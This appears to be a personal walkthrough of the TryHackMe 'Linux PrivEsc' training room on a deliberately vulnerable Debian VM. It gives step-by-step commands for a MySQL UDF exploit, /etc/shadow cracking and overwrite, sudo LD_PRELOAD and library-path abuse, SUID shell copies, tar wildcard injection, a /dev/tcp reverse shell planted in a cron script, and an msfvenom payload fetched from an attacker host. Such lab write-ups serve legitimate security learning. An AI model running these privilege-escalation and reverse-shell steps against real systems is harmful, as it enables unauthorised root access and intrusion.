# Linux PrivEsc TryHackMe
# Task 1 : Deploy the Vulnerable Debian VM 
connect to ssh using 
```
ssh user@IP 
```
or use this in case of any errors
```
ssh user@IP -oHostKeyAlgorithms=+ssh-rsa
```
then use `id` command to get the result

# Task 2 : Service Exploits

Change into the /home/user/tools/mysql-udf directory:
```
cd /home/user/tools/mysql-udf
```
Compile the raptor_udf2.c exploit code using the following commands:
```
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```
Connect to the MySQL service as the root user with a blank password:
```
mysql -u root
```
Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do_system" using our compiled exploit:
```
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```
Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:
```
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```
Exit out of the MySQL shell (type exit or \q and press Enter) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
```
/tmp/rootbash -p
```
Remember to remove the /tmp/rootbash executable and exit out of the root shell before continuing as you will create this file again later in the room!
```
rm /tmp/rootbash
exit
```

# Task 3 : Weak File Permissions - Readable /etc/shadow

Checking permission on */etc/shadow*
```
ls -l /etc/shadow
```
then read the file using `cat /etc/shadow`\
*root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::*

Identify the hash using hashcat 

```
hashcat '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0'
```
output
```
1800 | sha512crypt $6$, SHA512 (Unix) | Operating System
```

now store the hash and crack it
```
hashcat -a 0 -m 1800 hash.txt /path/rockyou.txt
```
if previously used then it won't show just use 
```
hashcat -a 0 -m 1800 hash.txt ../rockyou.txt --show
```
ouptut
```
$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:password123
```

# Task 4 : Weak File Permissions - Writable /etc/shadow

Checking permission on */etc/shadow*
```
ls -l /etc/shadow
```
it's writable so Generate a new password hash with a password of your choice:
```
mkpasswd -m sha-512 newpasswordhere
```
output
```
$6$Cd1QRSVOD8km$KAi07b699vqKBIZ8df6OEM.E2gERFDkuQb.8wuyT.BIGal6yV0yTyGCupw27wj4CCJO98woiVjJrJyI45glrH/
```
now edit the *e/tc/shadow*\
replace the \
`root:<put_your_generated_hash_here:17298:0:99999:7:::`\
save and login using `su root`

You're Done root 😎

# Task 5 : Weak File Permissions - Writable /etc/passwd

Note that the /etc/passwd file is world-writable:
```
ls -l /etc/passwd
```
Generate a new password hash with a password of your choice:
```
openssl passwd password
```
Now edit the /etc/passwd file and replace x with the new genrated password\
`root:x:0:0:root:/root:/bin/bash` to `root:IMyXn8qsuEBEo:0:0:root:/root:/bin/bash`

Login to root `su root` get the id using `id` command and You're done 😎

# Task 6 : Sudo - Shell Escape Sequences

List the programs which sudo allows your user to run:
```
sudo -l
```
output
```
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more

```
search [GTFObins](https://gtfobins.github.io/) for sudo escape sequence 
here apache doesn't have a escape sequence but we can use this to read a file that we don't have permission to :
```
cat /etc/shadow-
cat: /etc/shadow-: Permission denied
```
but with apache2 
```
sudo apache2 -f /etc/shadow-
Syntax error on line 1 of /etc/shadow-:
Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration
```
And You're done 😄

# Task 7 : Sudo - Environment Variables

Check which environment variables are inherited (look for the env_keep options):
```
sudo -l
```
LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.

Create a shared object using the code located at /home/user/tools/sudo/preload.c:
```
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```
Run one of the programs you are allowed to run via sudo (listed when running sudo -l), while setting the LD_PRELOAD environment variable to the full path of the new shared object:
```
sudo LD_PRELOAD=/tmp/preload.so awk
```

A root shell should spawn. Exit out of the shell before continuing. Depending on the program you chose, you may need to exit out of this as well.

Run ldd against the apache2 program file to see which shared libraries are used by the program:
```
ldd /usr/sbin/apache2
```
Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library_path.c:
```
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```
Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):
```
sudo LD_LIBRARY_PATH=/tmp apache2
```

# Task 8 : Cron Jobs - File Permissions

View the contents of the system-wide crontab:
```
cat /etc/crontab
```
There should be two cron jobs scheduled to run every minute. One runs overwrite.sh, the other runs /usr/local/bin/compress.sh.

Locate the full path of the overwrite.sh file:
```
locate overwrite.s
```
ouptut
```
/usr/local/bin/overwrite.sh
```

Note that the file is world-writable:
```
ls -l /usr/local/bin/overwrite.sh
```

overwrite the file with this 
```
#!/bin/bash
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
```

start your listner 
```
nc -nvlp 4444
```
you'll get the shell in a minute and you're done 😸

# Task 9 : Cron Jobs - PATH Environment Variable

View the contents of the system-wide crontab:
```
cat /etc/crontab
```
`Note that the PATH variable starts with /home/user which is our user's home directory.`

Create a file called overwrite.sh in your home directory with the following contents:
```
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

Make sure that the file is executable:
```
chmod +x /home/user/overwrite.sh
```
Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges:
```
/tmp/rootbash -p
```
now remove the temp file
```
rm /tmp/rootbash
exit
```

# Task 10 : Cron Jobs - Wildcards

View the contents of the other cron job script:
```
cat /usr/local/bin/compress.sh
```
Note that the tar command is being run with a wildcard (*) in your home directory.

Take a look at the GTFOBins page for [tar](https://gtfobins.github.io/gtfobins/tar/). Note that tar has command line options that let you run other commands as part of a checkpoint feature.

Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
```
Transfer the shell.elf file to /home/user/ on the Debian VM (you can use scp or host the file on a webserver on your Kali box and use wget). Make sure the file is executable:
I used python webserver\
on attacker machine : `python3 -m http.server 80` and on the VM `wget <attackerip>/shell.elf`\
then
```
chmod +x /home/user/shell.elf
```
Create these two files in /home/user:
```
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```

Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.
```
nc -nvlp 4444
```
Remember to exit out of the root shell and delete all the files you created to prevent the cron job from executing again:
```
rm /home/user/shell.elf
rm /home/user/--checkpoint=1
rm /home/user/--checkpoint-action=exec=shell.elf
```

# Task 11 : SUID / SGID Executables - Known Exploits

Find all the SUID/SGID executables on the Debian VM:
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
result 
```
-rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry
-rwxr-sr-x 1 root ssh 108600 Apr  2  2014 /usr/bin/ssh-agent
-rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh
-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudo
-rwxr-sr-x 1 root tty 11000 Jun 17  2010 /usr/bin/bsd-write
-rwxr-sr-x 1 root crontab 35040 Dec 18  2010 /usr/bin/crontab
-rwsr-xr-x 1 root root 32808 Feb 15  2011 /usr/bin/newgrp
-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudoedit
-rwxr-sr-x 1 root shadow 56976 Feb 15  2011 /usr/bin/chage
-rwsr-xr-x 1 root root 43280 Feb 15  2011 /usr/bin/passwd
-rwsr-xr-x 1 root root 60208 Feb 15  2011 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 39856 Feb 15  2011 /usr/bin/chfn
-rwxr-sr-x 1 root tty 12000 Jan 25  2011 /usr/bin/wall
-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
-rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env
-rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2
-rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3
-rwsr-xr-x 1 root root 6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10592 Feb 15  2016 /usr/lib/pt_chown
-rwsr-xr-x 1 root root 36640 Oct 14  2010 /bin/ping6
-rwsr-xr-x 1 root root 34248 Oct 14  2010 /bin/ping
-rwsr-xr-x 1 root root 78616 Jan 25  2011 /bin/mount
-rwsr-xr-x 1 root root 34024 Feb 15  2011 /bin/su
-rwsr-xr-x 1 root root 53648 Jan 25  2011 /bin/umount
-rwsr-sr-x 1 root root 926536 Sep 25 10:30 /tmp/rootbash
-rwxr-sr-x 1 root shadow 31864 Oct 17  2011 /sbin/unix_chkpwd
-rwsr-xr-x 1 root root 94992 Dec 13  2014 /sbin/mount.nfs
```
the *exim-4.84-3* looks interesting so search in [exploitdb](https://www.exploit-db.com)\
search for exim-4-84.3 and download the exploit\
make it executeable using `chmod +x cve-2016-1531.sh`\
Run the exploit script to gain a root shell:
```
./cve-2016-1531.sh
```
There you go you goth the shell 😺
